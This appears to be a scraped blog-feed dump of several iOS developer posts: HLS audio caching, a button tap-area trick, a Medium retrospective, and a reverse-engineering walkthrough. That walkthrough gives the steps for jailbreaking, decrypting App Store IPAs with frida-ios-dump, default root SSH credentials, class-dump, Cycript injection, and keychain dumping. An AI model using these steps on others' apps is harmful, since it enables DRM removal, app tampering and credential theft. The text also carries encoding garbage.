playing music, in non-streaming cases, we use mp3 files as music files. The playback can only start after the entire file is downloaded, which takes time depending on the file size. HLS, on the other hand, splits a file into multiple small segments and plays as it reads. So, playback can start as soon as the first segment is received, without downloading the whole file!.m3u8 files record the bitrate, playback order, duration of the segmented .ts files, and overall audio information. They can also support encryption, decryption, low-latency streaming, and more..m3u8 file example (aviciiwakemeup.m3u8):#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-TARGETDURATION:10#EXT-X-MEDIA-SEQUENCE:0#EXTINF:9.900411,aviciiwakemeup‚Äì00001.ts#EXTINF:9.900400,aviciiwakemeup‚Äì00002.ts#EXTINF:9.900411,aviciiwakemeup‚Äì00003.ts#EXTINF:9.900411,...#EXTINF:6.269389,aviciiwakemeup-00028.ts#EXT-X-ENDLISTEXT-X-ALLOW-CACHE has been deprecated in iOS‚â• 8/Protocol Ver.7, so including it has no effect.GoalFor a streaming service, Cache is extremely important; each audio file can range from a few MB to several GB. If the file has to be fetched from the server every time it is replayed, it puts a heavy load on the server and consumes a lot of bandwidth, which is costly \\(\\). Having a cache layer can save the service a lot of money and also prevent users from wasting network data and time on re-downloading. It‚Äôs a win-win mechanism (but remember to set limits and clear the cache periodically to avoid filling up the user‚Äôs device).QuestionIn the past, before streaming, there was not much to handle with mp3/mp4 files. The files were downloaded to the device before playback, and playback would start only after the download was complete. Since the entire file had to be downloaded anyway, we could simply use URLSession to download the file first, then feed the local file path with a file:// URL to AVPlayer for playback. Alternatively, the proper way is to use AVAssetResourceLoaderDelegate to cache the downloaded data within the delegate methods.The idea behind streaming is actually straightforward: first read the .m3u8 file, then parse the information inside, and cache each .ts file; but in practice, it turned out to be more complicated than I expected, which is why I wrote this article!For playback, we use iOS AVFoundation‚Äôs AVPlayer directly. There is no difference in handling streaming or non-streaming files.Example:let url:URL = URL(string:\"https://zhgchg.li/aviciiwakemeup.m3u8\")var player: AVPlayer = AVPlayer(url: url)player.play() // Play the media2021‚Äì01‚Äì05 Update:As a fallback, we switch back to using mp3 files, which allows direct implementation with AVAssetResourceLoaderDelegate. For detailed implementation, refer to ‚ÄúAVPlayer Streaming Cache Practical Guide‚Äù.Implementation PlanRegarding several solutions to achieve our goals and the challenges encountered during implementation.Option 1. AVAssetResourceLoaderDelegate ‚ùåThe first idea is to follow the same approach as with mp3/mp4! Use AVAssetResourceLoaderDelegate to cache .ts files within the delegate methods.However, sorry, this approach won‚Äôt work because the download request information for .ts files cannot be intercepted in the Delegate. You can refer to this Q&amp;A and the official documentation for details on this issue.The implementation of AVAssetResourceLoaderDelegate can refer to ‚ÄúAVPlayer Streaming and Caching in Practice‚Äù.Option 2.1 URLProtocol Intercept Requests ‚ùåURLProtocol is a method I recently learned. All requests based on the URL Loading System (URLSession, API calls, image downloads, etc.) can be intercepted by us to modify the Request and Response, then returned as if nothing happened‚Äîsecretly. For more on URLProtocol, refer to this article.Using this method, we plan to intercept AVFoundation AVPlayer requests for .m3u8 and .ts files. If there is a local cache, we return the cached data directly; if not, we send the actual request. This approach helps us achieve our goal.Similarly, sorry, this path also doesn‚Äôt work; because AVFoundation AVPlayer requests are not made through the URL Loading System, we cannot intercept them.There is a saying that it works on the simulator but not on a real devicePlan 2.2 Forcibly Allow URLProtocol ‚ùåAccording to Plan 2.1, the wildly creative brute force method, if I change the request URL to a custom scheme (e.g., streetVoiceCache://), since AVFoundation cannot handle this request, it will throw it out. This way, our URLProtocol can intercept it and do what we want.let url:URL = URL(string:\"streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https\")var player: AVPlayer = AVPlayer(url: url)player.play()URLProtocol intercepts streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https. At this point, we just need to restore it to the original URL, then use URLSession to request the data, allowing us to handle caching here. Requests for .ts files in the m3u8 will also be intercepted by URLProtocol, enabling us to cache them as well.Everything seemed perfect, but when I excitedly Build-Run the app, Apple slapped me hard:Error: 12881 ‚ÄúCoreMediaErrorDomain custom url not redirect‚ÄùHe does not accept the .ts file Request Response Data I provide. I can only use the urlProtocol:wasRedirectedTo method to redirect to the original HTTPS request to play properly. Even if I download the .ts file locally and redirect to that file:// file, it is not accepted. Checking the official forum reveals the answer: this cannot be done. The .m3u8 must come from HTTP/HTTPS (so even if you put the entire .m3u8 and all segmented .ts files locally, AVPlayer cannot play them using file://). Also, .ts files cannot use URLProtocol to provide Data by yourself.fxxk‚Ä¶Plan 2.2‚Äì2 ‚Äì Same as Plan 2.2 but implemented with Plan 1 AVAssetResourceLoaderDelegate ‚ùåThe implementation follows method 2.2, feeding AVPlayer a custom scheme to trigger AVAssetResourceLoaderDelegate; then we handle it ourselves.Same as 2.2 results:Error: 12881 ‚ÄúCoreMediaErrorDomain custom url not redirect‚ÄùOfficial Forum same answer.Can be used for decryption processing (refer to this article or this example), but caching functionality still cannot be achieved.Option 3. Reverse Proxy Server ‚çª (Feasible but Imperfect)This method is the most common answer when looking for how to handle HLS Cache; it involves running an HTTP Server on the app to serve as a Reverse Proxy Server.The principle is simple: the app runs an HTTP server, for example on port 8080, so the URL will be http://127.0.0.1:8080/; then we can handle incoming requests and provide responses.Applied to our case, replace the request URL with:http://127.0.0.1:8080/aviciiwakemeup.m3u8?origin=http://zhgchg.li/In the HTTP Server‚Äôs Handler, intercept requests for *.m3u8. When a request comes in, it will enter our Handler, allowing us to do whatever we want. We have full control over the response data. .ts files will also come through here; this is where we can implement our desired caching mechanism.For AVPlayer, it is a standard http://.m3u8 streaming audio file, so there will be no issues.A complete implementation example can be found at:Because I also referred to this example, I used GCDWebServer for the Local HTTP Server part. Additionally, there is an updated Telegraph available. (I do not recommend CocoaHttpServer as it has not been updated for a long time.)Looks good! But there‚Äôs a problem:Our service is music streaming, not a video playback platform. In music streaming, users often switch tracks while running the app in the background; would the Local HTTP Server still be running then??The description of GCDWebServer states that it will automatically disconnect when entering the background and automatically resume when returning to the foreground. However, you can disable this behavior by setting the parameter GCDWebServerOption_AutomaticallySuspendInBackground:false.However, in actual tests, if no requests are sent for a while, the server still disconnects (and the status is incorrect, still showing as isRunning). It feels like the system is killing it. After digging into the HTTP Server approach, I found that the underlying implementation is based on sockets. After checking the official documentation on socket services, this issue cannot be resolved. When there are no new connections in the background, the system will suspend it.*There are complicated methods found online‚Ä¶ such as sending a long request or continuously sending empty requests to ensure the server is not paused by the system in the background.The above points all refer to the app running in the background. When in the foreground, the server is stable and won‚Äôt be paused due to inactivity, so this issue does not occur!Since it relies on other services, even if testing in the development environment works fine, it is recommended to implement a rollback handling (AVPlayer.AVPlayerItemFailedToPlayToEndTimeErrorKey notification) in actual use; otherwise, if the service fails, the user will be stuck.So it's not perfect‚Ä¶Option 4. Using the HTTP Client‚Äôs own caching mechanism ‚ùåOur .m3u8/.ts files‚Äô Response Headers all include Cache-Control, Age, eTag, and other HTTP Client Cache information. Our website‚Äôs cache mechanism works perfectly on Chrome. Additionally, the official new preliminary specification for the Protocol Extension for Low-Latency HLS also mentions that cache-control headers can be set for caching.However, in reality, AVFoundation AVPlayer does not have any HTTP Client Caching effect, so this approach is also ineffective! It‚Äôs just wishful thinking.Solution 5. Playing Audio Files Without Using AVFoundation AVPlayer ‚úîImplement audio file parsing, caching, encoding, and playback functions by yourself.Too hardcore, requires deep technical skills and a lot of time; no research done.Here is an open-source online player for reference: FreeStreamer. If you really want to choose this solution, it‚Äôs better to stand on the shoulders of giants and use a third-party library directly.Plan 5‚Äì1. Without Using HLSSame as Plan 5, too hardcore, requires deep technical skills and a lot of time; no research done.Solution 6. Convert .ts Split Files to .mp3/.mp4 Files ‚úîNo research done, but it is indeed feasible; however, it feels complicated. You need to handle the downloaded .ts files, convert each one into .mp3 or .mp4 files, then play them in order, or compress them into a single file, which sounds difficult to do.If interested, you can refer to this article.Option 7. Download the complete file before playing ‚çªThis method cannot be accurately called streaming with caching; it actually downloads the entire audio file before starting playback. For .m3u8 files, as mentioned in solution 2.2, you cannot directly download and play them locally.To implement this, you need to use the iOS ‚â• 10 API AVAssetDownloadTask.makeAssetDownloadTask. It actually packages the .m3u8 into a .movpkg stored locally for user playback.This is more like offline playback rather than a caching feature.Users can also view and manage downloaded audio files from ‚ÄúSettings‚Äù -&gt; ‚ÄúGeneral‚Äù -&gt; ‚ÄúiPhone Storage‚Äù -&gt; APP.‰∏ãÊñπ Â∑≤‰∏ãËºâÁöÑÂΩ±Áâá ÈÉ®ÂàÜBelow is the Downloaded Videos sectionFor detailed implementation, refer to this example:ConclusionThe above exploration took nearly a whole week, going around in circles and almost driving me crazy; currently, there is no reliable and easy-to-deploy method.If there are new ideas, I will update again!References iOS Audio Playback (Part 9): Play While Caching StyleShare/HLSCachingReverseProxyServer If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Reverse EngineeringÔΩúJailbreak, IPA Extraction, UI Injection & Decompilation Techniques", "url": "/posts/zrealm-dev/ios-reverse-engineering-jailbreak-ipa-extraction-ui-injection-decompilation-techniques-7498e1ff93ce/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, hacking, jailbreak, security", "date": "2020-03-28 18:24:40 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!First Experience with iOS Reverse EngineeringThe Exploration Process from Jail...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!First Experience with iOS Reverse EngineeringThe Exploration Process from Jailbreaking, Extracting IPA Files and Cracking to UI Analysis, Injection, and DecompilationAbout SecurityThe only security-related topic I have covered before is ¬´¬†Using Man-in-the-Middle Attack to Sniff Transmission Data¬†¬ª; building on that, suppose we encrypt data before transmission and decrypt it inside the app upon receipt to prevent man-in-the-middle sniffing. Is it still possible for the data to be stolen? The answer is definitely yes! Even if it hasn‚Äôt been tested; there is no unbreakable system in the world, only the issue of time cost. When the time and effort required to break it exceed the benefits gained, it can be considered secure!How?Having come this far, how else can it be broken? This is the topic I want to document in this article ‚Äî ‚ÄúReverse Engineering‚Äù ‚Äî cracking open your app to study how you do encryption and decryption. I have always been somewhat clueless in this field, only having attended two major talks at iPlayground 2019, roughly understanding the principles and implementation. Recently, I had the chance to try it out and want to share it with everyone!Against the Current, What Can It Do? Check APP UI Layout and Structure Access APP resource directories such as .assets/.plist/icon‚Ä¶ Tamper with App Features and Repackage (e.g., Remove Ads) Decompile to infer the original code and obtain business logic information Dump .h header files / keychain contents Environment SetupmacOS Version: 10.15.3 CatalinaiOS Version: iPhone 6 (iOS 12.4.4 / Jailbroken) RequiredCydia: Open SSHJailbreak SectionAny iOS or iPhone version can be used, as long as the device can be jailbroken. It is recommended to use an old phone or a development device to avoid unnecessary risks. You can refer to Mr. Mad‚Äôs Jailbreak Guide based on your phone and iOS version. If needed, you may have to downgrade iOS (check signing status) before jailbreaking.I used my old iPhone 6 for testing. It was already updated to iOS 12.4.5, but jailbreak attempts on 12.4.5 kept failing. Fortunately, I downgraded to 12.4.4 first and then successfully jailbroke it using checkra1n!The steps are few and not difficult; they just require some waiting time!An experience of my own mistake: After downloading the older IPSW file, connect the iPhone to your Mac and open Finder (since macOS 10.15, there is no iTunes). On the left under Locations, select your iPhone. When the iPhone info screen appears, hold the ‚ÄúOption‚Äù key and then click ‚ÄúRestore iPhone‚Äù to bring up the IPSW file selection window. Choose the older IPSW file you just downloaded to complete the downgrade. I originally foolishly pressed Restore iPhone‚Ä¶ it would only waste time reinstalling the latest version again‚Ä¶.Using the lookin Tool to Inspect Others‚Äô App UI LayoutsLet‚Äôs start with a fun appetizer: using tools with a jailbroken phone to see how other people‚Äôs apps are laid out.Viewing tools: First is the long-established Reveal (more features, paid around $60 with trial available), second is the free open-source tool lookin made by Tencent QMUI Team; here we use lookin as a demonstration, Reveal is quite similar. No jailbreak needed. This tool is mainly for use in projects under development to check debug layouts (replacing Xcode‚Äôs basic inspector). It can also be used in regular development! Only when you need to view other people‚Äôs apps do you need a jailbroken phone.If you want to view your own projects‚Ä¶You can choose to install using CocoaPods, Breakpoint Insertion (simulator only), Manually Import Framework into Project, or Manual Setup.After building and running the project, you can select the APP screen on the Lookin tool -&gt; view the layout structure.If You Want to See Someone Else‚Äôs APP‚Ä¶Step 1. On a jailbroken phone, open Cydia -&gt; search for LookinLoader -&gt; Install -&gt; go back to the phone Settings -&gt; Lookin -&gt; Enabled Applications -&gt; Enable the apps you want to monitor.Step 2. Use a cable to connect your phone to the Mac -&gt; open the app you want to view -&gt; return to the computer, select the app screen in the Lookin tool -&gt; you can then view the layout structure.Lookin Check Layout StructureFacebook Login Screen Layout StructureYou can view the hierarchy in the left sidebar and dynamically modify the selected object in the right sidebar.The original ‚ÄúCreate New Account‚Äù has been changed to ‚ÄúHaha‚Äù.Modifications to objects will also be displayed in real-time on the mobile app, as shown above.Just like the ‚ÄúF12‚Äù developer tools in a web browser, all changes only affect the View and do not impact the actual data; it is mainly used for debugging. Of course, you can also use it to change values, take screenshots, and prank your friends XDUse Reveal to Inspect APP UI Layout StructureAlthough Reveal requires a paid subscription, I personally prefer it; it provides more detailed structure display, and the right info panel is almost identical to the XCode development environment. You can make real-time adjustments as needed, and it also alerts you to Constraint Errors, which is very helpful for UI layout fixes!These two tools are very helpful for daily development of your own APP! After understanding the process environment and key points, let‚Äôs get to the main topic! The following steps require a jailbroken phoneExtracting APP .ipa File &amp; CrackingAll apps installed from the App Store have their .ipa files protected by FairPlay DRM, commonly known as shell protection. Removing this protection is called ‚Äúcracking.‚Äù Therefore, simply extracting the .ipa from the App Store is meaningless and unusable.*Another tool, APP Configurator 2, can only extract protected files. Since it is not very useful, I won‚Äôt elaborate further. Those interested in using this tool can click here to see the tutorial.Extracting the original .ipa file after cracking using tools + jailbroken phone:Regarding the tools, I initially used Clutch, but no matter how I tried, it showed FAILED. After checking the project‚Äôs issues, I found many people had the same problem. It seems this tool no longer works on iOS ‚â• 12. There is also a classic tool called dumpdecrypted, but I haven‚Äôt looked into it.Here, we use the Python tool frida-ios-dump for dynamic unpacking, which is very convenient to use!First, let‚Äôs prepare the environment on the Mac: Mac comes with Python 2.7 pre-installed. This tool supports both Python 2.X and 3.X, so there is no need to install Python separately. However, I use Python 3.X for my operations. If you encounter issues with Python 2.X, consider installing and using Python 3! Install pip (Python package manager) Install frida using pip:sudo pip install frida --upgrade --ignore-installed six (python 2.X)sudo pip3 install frida --upgrade --ignore-installed six (python 3.X) Type frida-ps in the Terminal. If no error message appears, the installation was successful! Clone the AloneMonkey/frida-ios-dump project Open the dump.py file in a text editor within the project. Confirm if the SSH connection settings are correct (no special changes needed by default)User = ‚Äòroot‚ÄôPassword = ‚Äòalpine‚ÄôHost = ‚Äòlocalhost‚ÄôPort = 2222 Environment on a Jailbroken Phone: Install Open SSH: Cydia ‚Üí Search ‚Üí Open SSH ‚Üí Install Install Frida source: Cydia ‚Üí Sources ‚Üí Top right ‚ÄúEdit‚Äù ‚Üí Top left ‚ÄúAdd‚Äù ‚Üí https://build.frida.re Install Frida: Cydia ‚Üí Search ‚Üí Frida ‚Üí Install the tool matching your phone‚Äôs processor version (e.g., I have an iPhone 6 A11, so I installed Frida for pre-A12 devices) After setting up the environment, start working: Connect the phone to the computer using a USB cable Open a Terminal on your Mac and enter iproxy 2222 22 to start the server. Ensure the phone/computer is on the same network (e.g., connected to the same WiFi) Open another Terminal and enter ssh root@127.0.0.1, then enter the SSH password (default is alpine) Open another Terminal to run shell commands, and cd into the cloned /frida-ios-dump directory.Enter dump.py -l to list the installed/running apps on the phone. Find the APP name / Bundle ID to be cracked and exported, then enter:dump.py APP_NAME_or_BundleID -o output_path/output_filename.ipaHere, you must specify the output path/filename because the default output path is /opt/dump/frida-ios-dump/. Since we don‚Äôt want to move it to /opt/dump, specifying the output path avoids permission errors. After a successful output, you can obtain the cracked .ipa file! The phone must be unlocked to use the tool. If connection errors occur, such as ‚Äúreset by peer,‚Äù try unplugging and reconnecting the USB cable or restarting iproxy. Rename the .ipa file directly to .zip, then right-click to extract the archive/Payload/APP_NAME.app will appearWith the original APP file, we can‚Ä¶1. Extract the APP‚Äôs resource directoryRight-click on APP_NAME.app ‚Üí ‚ÄúShow Package Contents‚Äù to view the app‚Äôs resource directory2. class-dump Extract APP .h Header File InformationUsing the class-dump tool to export all APP (including Framework) .h header file information (Objective-C only; not valid for Swift projects)nygard/class-dump I tried this great tool but kept failing; in the end, I succeeded only by using the modified class-dump tool from AloneMonkey / MonkeyDev toolset. Download MonkeyDev/bin/class-dump tool directly from here Open Terminal and run directly:./class-dump -H APP_PATH/APP_NAME.app -o EXPORT_TARGET_PATH After a successful dump, you can obtain the entire app‚Äôs .h information.4. The Final and Most Difficult Step ‚Äî Performing DecompilationYou can use the decompilation tools IDA and Hopper for analysis. Both are paid tools, but Hopper offers a free trial (30 minutes per session).We can directly drag the obtained APPName.app file into Hopper to start the analysis.However, I stopped here because from this point on, it requires studying machine code, analyzing class-dump results to infer methods, and so on; it demands very advanced skills!After bypassing decompilation, you can modify the operation yourself and repackage it into a new APP.Image taken from One PieceOther Tools for Reverse Engineering1. Use MITM Proxy Free Tool to Sniff API Network Request Information ¬ªThe app uses HTTPS for transmission, but data was still stolen.2.Cycript (Used with Jailbroken Devices) Dynamic Analysis/Injection Tool: Open ‚ÄúCydia‚Äù on a jailbroken phone -&gt; Search for ‚ÄúCycript‚Äù -&gt; ‚ÄúInstall‚Äù Open a Terminal on your computer and use Open SSH to connect to your phone: ssh root@phoneIP (default password is alpine) Open the target APP (APP remains in the foreground) In Terminal, enter ps -e \\| grep APP Bundle ID to find the running APP Process ID Inject the tool into a running app using cycript -p Process ID You can use Objective-C/Javascript for debugging control.For Example:cy# alert = [[UIAlertView alloc] initWithTitle:@\"HIHI\" message:@\"ZhgChg.li\" delegate:nil cancelButtonTitle:@\"Cancel\" otherButtonTitles:nil]cy# [alert show]Inject a UIAlertViewController‚Ä¶ chose( ) : Get target UIApp.keyWindow.recursiveDescription().toString() : Displays the view hierarchy structure information new Instance (memory address): Get object exit(0) : Exit For detailed instructions, please refer to this article.3. Lookin / Reveal UI layout inspection toolsAs mentioned before, recommending it again; it‚Äôs very useful for daily development in your own projects. I suggest purchasing and using Reveal.4. MonkeyDev Integration Tool, allows dynamic injection to modify an app and repackage it into a new app5. ptoomey3 / Keychain-Dumper , Export KeyChain ContentsFor detailed instructions, please refer to this article, but I couldn‚Äôt get it to work. According to the project issues, it seems to have stopped working on iOS ‚â• 12.SummaryThis field is a huge challenge and requires a solid technical foundation to master; this article only briefly ‚Äúexperienced‚Äù what reverse engineering feels like, so please forgive any shortcomings! For academic research only, do not engage in malicious activities; personally, I found the entire process and tools quite interesting and gained a better understanding of APP security!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Button Tap Area ExpansionÔΩúEnhance User Interaction with Custom pointInside Override", "url": "/posts/zrealm-dev/ios-button-tap-area-expansion-enhance-user-interaction-with-custom-pointinside-override-a8c2d7ed144b/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, swift, attention-to-detail, uikit, ios", "date": "2020-02-01 21:45:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Expand Button Tap AreaRewrite pointInside to expand the touch areaIn daily...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Expand Button Tap AreaRewrite pointInside to expand the touch areaIn daily development, it‚Äôs common to follow the design UI layout perfectly, making the interface look beautiful, but the actual button touch area is too small, making it hard to tap accurately; this is especially unfriendly for people with thick fingers.Completed sample imageBefore‚Ä¶Regarding this issue, I didn‚Äôt research it deeply at first. I simply overlaid a larger transparent UIButton on the original button and used this transparent button to handle events. This approach is very troublesome and hard to manage when there are many components.Later, the issue was solved using layout. The button was set with top, bottom, left, and right constraints all at 0 (or less) during layout, then the imageEdgeInsets, titleEdgeInsets, and contentEdgeInsets were adjusted to position the icon/button title correctly according to the UI design. However, this approach is more suitable for projects using Storyboard/xib because you can directly adjust the layout in Interface Builder. Another point is that the designed icon should ideally have no extra spacing; otherwise, it becomes difficult to align properly. Sometimes it gets stuck at a 0.5 distance that can‚Äôt be adjusted correctly.After‚Ä¶As the saying goes, the more you see, the more you know. Recently, after working on a new project, I learned a neat trick: you can enlarge the touch area in UIButton‚Äôs pointInside method. By default, it uses the UIButton‚Äôs bounds, but you can extend the bounds inside to make the button‚Äôs clickable area bigger!After the above approach‚Ä¶ we can:class MyButton: UIButton { var touchEdgeInsets:UIEdgeInsets? override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}Customize a UIButton by adding a public property touchEdgeInsets to store the expanded touch area for convenience; then override the pointInside method to implement this idea.Usage:import UIKitclass MusicViewController: UIViewController { @IBOutlet weak var playerButton: MyButton! override func viewDidLoad() { super.viewDidLoad() playerButton.touchEdgeInsets = UIEdgeInsets(top: -10, left: -10, bottom: -10, right: -10) } }Play button / Blue is the original click area / Red is the expanded click rangeWhen using, just remember to set the Button‚Äôs Class to our custom MyButton, then you can expand the clickable area for each Button by setting touchEdgeInsets! Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏è When using Storyboard/xib, remember to set the Custom Class to MyButton ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è touchEdgeInsets extends outward from (0,0) at the center, so the distances for top, bottom, left, and right should use negative values to expand.Looks good‚Ä¶ but:Replacing every UIButton with a custom MyButton is quite tedious and increases code complexity. It may even cause conflicts in large projects.For this feature that we believe every UIButton should inherently have, if possible, we hope to directly extend the original UIButton through an Extension:private var buttonTouchEdgeInsets: UIEdgeInsets?extension UIButton { var touchEdgeInsets:UIEdgeInsets? { get { return objc_getAssociatedObject(self, &amp;buttonTouchEdgeInsets) as? UIEdgeInsets } set { objc_setAssociatedObject(self, &amp;buttonTouchEdgeInsets, newValue, .OBJC_ASSOCIATION_RETAIN_NONATOMIC) } } override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}Usage as shown in the example above.Because Extensions cannot contain Properties, otherwise it will cause a compile error ‚ÄúExtensions must not contain stored properties,‚Äù here we refer to Using Property with Associated Object to associate the external variable buttonTouchEdgeInsets with our Extension, allowing it to be used like a regular Property. (For detailed principles, please refer to Mao Da‚Äôs article)UIImageView (UITapGestureRecognizer)?For image taps, the tap gesture we added on the View;we can achieve the same effect by overriding UIImageView‚Äôs pointInside. Done! After continuous improvements, solving this issue has become much simpler and more convenient!References:UIView Change Touch Area (Objective-C)PostscriptLast year around the same time, I wanted to create a subcategory called ‚ÄúSmall Things Lead to Big Things‚Äù to record daily trivial development tasks. These small tasks quietly accumulate and can significantly improve the app‚Äôs experience and code quality. However, after a year, I finally added another article &lt;( _ _ )&gt;. Small things are really easy to forget to record!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Medium Growth ReviewÔΩúKey Insights and Strategies from One Year of Content Management", "url": "/posts/zrealm-life/medium-growth-review-key-insights-and-strategies-from-one-year-of-content-management-d01252331b53/", "categories": "ZRealm Life.", "tags": "english, ai-translation, medium, ios, life, writing-life, medium-taiwan", "date": "2020-01-12 23:49:30 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!One-Year Review of Managing MediumA Detailed Review of Running Medium for One ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!One-Year Review of Managing MediumA Detailed Review of Running Medium for One Year or a 2019 SummaryIn the blink of an eye, it has been a year since publishing articles on Medium. The actual anniversary should have been October 2019 (the first post was in October 2018); but I was too busy and lacked inspiration then. Now, as time moves forward into 2020, I‚Äôm quickly recording my insights from a year of writing, also as a summary of 2019!ReviewFirst, I want to thank Enther Wu and Chih-Hung Yeh for inspiring me and reigniting my passion for writing. My early articles were more like personal daily or work notes and were quite shallow. However, I shamelessly shared them on social media. Looking back now, those initial posts seem a bit awkward and lack valuable content.However, it is all part of the growth process. The more I write, the more skilled I become. The scope of my research expands as I document. Fearing to mislead others, overlook details, or misunderstand, the pressure turns writing into not just recording but a deep exploration of a topic. This results in greater personal growth and, correspondingly, a significant improvement in the quality of content shared with everyone.The community is truly kind-hearted. At first, I was afraid of being criticized and losing confidence when posting; but that didn‚Äôt happen. The feedback from everyone has been very positive. Even if the content isn‚Äôt always helpful, this positive encouragement has boosted my confidence in creating and motivated me to spend more time documenting. Thank you all for the support!Medium offers a great writing experience. If you are a developer, you can install Code Medium, a Chrome extension that lets you paste beautiful code using Gist directly within Medium!Publication &amp; LogoWrote about life and technology, and fortunately created two Publication channels for distinction: ZRealm Life. shares life and unboxings / ZRealm Dev. shares work and technical articles,so everyone can follow based on the content they want to see.A very ‚ÄúWestern-style‚Äù thing ‚Äî ‚ÄúLOGO‚Äù. Should life have a sense of ritual? Since it‚Äôs about management, there should be a personal brand identity, right?So, I asked a designer to help create my logo concept; my design idea: the outer pentagon shape pays tribute to my alma mater NTUST‚Äôs emblem. The five sides represent a wrench symbolizing technical craftsmanship. The inner frame ‚ÄúZR‚Äù actually means unchanged, representing the first letter ‚ÄúZ‚Äù of my English-translated Chinese name ZhongCheng, and the ‚ÄúR‚Äù from Realm, my territory.GainsTo talk about gains, let‚Äôs start with the original intention of writing ‚Äî ‚ÄúTeaching benefits both teacher and student.‚Äù It‚Äôs not to show off or make money; none of my articles have paywalls because knowledge shouldn‚Äôt require payment to access. Knowledge is power. If you like it, please consider supporting Medium‚Äôs paid membership so we can sustain the platform longer‚Ä¶ (I‚Äôm really worried it might not survive losses).If I were to talk about gains, aside from financial benefits, I have gained a lot in other areas. First is the sense of achievement; having readers and feedback gives me a strong sense of accomplishment and motivates me to keep writing. Next is meeting many friends and having more interactions. I am a passive social person, and before writing articles, I was very unfamiliar with social communities and had almost no interaction. Now, having met many friends, I feel I am no longer alone on the path of development! (Just like the subtitle of my Publication ‚Äî ‚ÄúYou are not alone on the road to solving problems‚Äù).StatisticsSince this is a review, it‚Äôs customary to include some statistics.In 2019 (including the end of 2018), a total of:25 articles were published: 2 lifestyle + 5 unboxing + 18 technical articlesAccumulated about 60,000 views, 5,000 claps, and surpassed 200 followers!Articles with Better Performance Include: iOS Deferred Deep Link Implementation (Swift) AirPods 2 Unboxing and First Impressions How to Create an Engaging Engineering CTF Competition The app uses HTTPS for transmission, but data was still stolen. Apple Watch Series 4 Complete Experience from Purchase to Use Thank you all for your support and love. I will continue to work hard this year! Your tracking and feedback are the driving force behind my writing!ZhgChgLi, 2020/01/11.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Mi Home App & Xiao Ai Speaker Region IssuesÔΩúResolve Connectivity for Xiaomi Air Purifier 3", "url": "/posts/zrealm-life/mi-home-app-xiao-ai-speaker-region-issues-resolve-connectivity-for-xiaomi-air-purifier-3-94a4020edb82/", "categories": "ZRealm Life.", "tags": "english, ai-translation, lifestyle, unboxing, xiaomi-air-purifier, ios, xiaomi", "date": "2020-01-12 22:04:14 +0800", "snippet": " 